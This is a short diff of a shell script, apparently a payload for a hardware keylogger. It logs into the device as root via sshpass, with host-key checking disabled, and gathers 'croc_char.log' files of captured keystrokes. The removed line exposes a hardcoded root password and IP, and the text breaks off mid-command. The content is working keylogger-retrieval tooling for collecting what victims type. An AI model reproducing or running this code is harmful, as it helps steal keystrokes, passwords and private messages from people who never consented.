@@ -119,7 +119,7 @@ case "$resp" in
 	$DUCKYSCRIPT_USER_CONFIRMED)
 		LOG green "Previous keystrokes (croc_char.log)"
 		spinnerid=$(START_SPINNER "Collecting keystroke...")
-		OUTPUT=$(sshpass -p "cody1975" ssh -o StrictHostKeyChecking=no root@172.16.42.206 "
+		OUTPUT=$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip "
 		find / -type f -name 'croc_char.log' 2>/dev/null -exec sh -c '
 		for file do
 			chars=\$(wc -m < \"\$file\")
